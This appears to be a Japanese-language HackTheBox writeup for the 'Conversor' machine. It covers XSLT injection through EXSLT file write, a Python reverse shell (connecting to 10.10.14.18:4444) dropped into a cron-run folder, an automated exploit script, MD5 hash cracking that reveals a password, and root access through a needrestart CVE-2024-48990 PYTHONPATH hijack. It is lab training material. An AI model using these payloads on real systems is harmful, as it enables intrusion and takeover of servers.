---
title: 'Conversor - HTB'
description: 'HackTheBox Machine ConversorのWriteupです。'
pubDate: 2026-01-19
category: 'HTB'
tags: ['HTB', 'Machine', 'Writeup', 'Linux', 'XML', 'XSLT', 'Needrestart', 'CVE-2024-48990']
---

# Conversor - HTB
## Foothold
### Port Scanning and Service Enumeration
```bash
nmap 10.129.201.124 -Pn -T4 -p 22,80 -A
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
### XSLT Injection
#### XML/XSLT Structure Verification
```xml
<?xml version="1.0"?>
<data><data/>
```
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/data">
    <output>
      <xsl:value-of select="document('file:///etc/passwd')"/>
    </output>
  </xsl:template>

</xsl:stylesheet>
```
> Error: Cannot resolve URI file:///etc/passwd
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/data">
    <output>
      <xsl:value-of select="system-property('xsl:vendor')"/>
      <xsl:value-of select="system-property('xsl:version')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
```
> vender: libxslt
> version: 1.0
#### Application Source Code Acquisition
> /aboutにアクセスするとアプリの構成ファイルをダウンロードできる
```py
# app.py
@app.route('/convert', methods=['POST'])
def convert():
  if 'user_id' not in session:
    return redirect(url_for('login'))
  xml_file = request.files['xml_file']
  xslt_file = request.files['xslt_file']
  from lxml import etree
  xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
  xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
  xml_file.save(xml_path)
  xslt_file.save(xslt_path)
  try:
    parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
    xml_tree = etree.parse(xml_path, parser)
    xslt_tree = etree.parse(xslt_path)
    transform = etree.XSLT(xslt_tree)
    result_tree = transform(xml_tree)
    result_html = str(result_tree)
    file_id = str(uuid.uuid4())
    filename = f"{file_id}.html"
    html_path = os.path.join(UPLOAD_FOLDER, filename)
    with open(html_path, "w") as f:
      f.write(result_html)
    conn = get_db()
    conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
    conn.commit()
    conn.close()
    return redirect(url_for('index'))
  except Exception as e:
    return f"Error: {e}"
```
```markdown
<!-- install.md -->
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
<!-- scripts配下の.pyが定期的に実行されている -->
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```
#### Exploiting EXSLT Extension for File Write
> XSLTは「XML → XML/HTML への変換」を行うものだが、拡張機能が有効な実装でファイル書き込みが可能になる。  
extension-element-prefixes="exsl"これにより拡張機能を有効化している。  
exsl:documentは本来、変換結果を別ファイルに保存する機能だが検証不備があると出力先やファイル内容を自由に指定できる。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl"
  version="1.0">
  <xsl:template match="/data">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py">
      import socket,subprocess,os,pty
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(("10.10.14.18",4444))
      os.dup2(s.fileno(),0)
      os.dup2(s.fileno(),1)
      os.dup2(s.fileno(),2)
      pty.spawn("/bin/bash")
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```
#### Automated Exploitation with Python Script
```py
import requests
from urllib.parse import *
from io import BytesIO

URL = "http://conversor.htb/"
s = requests.Session()

endpoint = "/register"
data = {
  "username": "test",
  "password": "test"
}
req = s.post(urljoin(URL, endpoint), data=data)

endpoint = "/login"
data = {
  "username": "test",
  "password": "test"
}
req = s.post(urljoin(URL, endpoint), data=data)

xml_payload = b"""<?xml version="1.0"?>
<data></data>
"""

xslt_payload = b"""<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl"
  version="1.0">

  <xsl:template match="/data">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,os,pty
s=socket.socket()
s.connect(("10.10.14.18",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
    </exsl:document>
  </xsl:template>

</xsl:stylesheet>
"""
endpoint = "/convert"
files = {
  "xml_file": ("payload.xml", BytesIO(xml_payload), "application/xml"),
  "xslt_file": ("payload.xslt", BytesIO(xslt_payload), "application/xml")
}
req = s.post(urljoin(URL, endpoint), files=files)
```
### Reverse Shell and Database Analysis
```bash
> python3 exploit.py
> nc -lnvp 4444
www-data@conversor:~$ pwd
pwd
/var/www/
www-data@conversor:~/conversor.htb/instance$ ls
ls
users.db
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
sqlite3 users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
.tables
files  users
sqlite> select * from users;
select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec # hashidの結果からMD5と予測
5|test|098f6bcd4621d373cade4e832627b4f6
```
### Hash Cracking and SSH Access
```bash
> echo "5b5c3ac3a1c897c94caad48e6c71fdec" > fismathack
> hashcat -m 0 -a 0 fismathack /usr/share/wordlists/rockyou.txt
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```
```bash
ssh fismathack@10.129.201.124 # Keepmesafeandwarm
fismathack@conversor:~$ 
```
### User Flag
```bash
fismathack@conversor:~$ ls
user.txt
```
## Privilege Escalation
### Sudoers Configuration and Needrestart Discovery
```bash
fismathack@conversor:~$ ./linpease.sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
```bash
sudo needrestart -h
Unknown option: h
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```
### Needrestart Overview and Vulnerability
機能
- ライブラリ更新を検知
- 古いライブラリを掴んでいるプロセスを列挙
- それらを再起動するか管理者に判断させる

> 管理者が sudo apt install や sudo apt upgrade などを実行すると needrestart が起動して victim が Exploit を実行していると管理者の shell を取られてしまう。
### CVE-2024-48990 Exploitation
- [CVE-2024-48990.link](https://github.com/ally-petitt/CVE-2024-48990-Exploit)
```bash
# tty 0
# ダウンロードしたファイルは一定時間後に自動削除されるため、必要なファイルは自分で作成した
fismathack@conversor:/tmp$ mkdir -p /tmp/evil/importlib
fismathack@conversor:/tmp/evil$ vim main.py
fismathack@conversor:/tmp/evil/importlib$ vim __init__.py
fismathack@conversor:/tmp$ export PYTHONPATH=/tmp/evil
fismathack@conversor:/tmp$ echo $PYTHONPATH
/tmp/evil
fismathack@conversor:/tmp/evil$ python3 main.py

# tty 1
# githubのままだとローカル内でlistenしてるが今回はvictimの方にReversShellした(__init__.pyを変更)
fismathack@conversor:~$ nc -lnvp 1337

# tty 2
fismathack@conversor:~$ sudo needrestart
```
### Root Flag
```bash
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
root.txt  scripts
```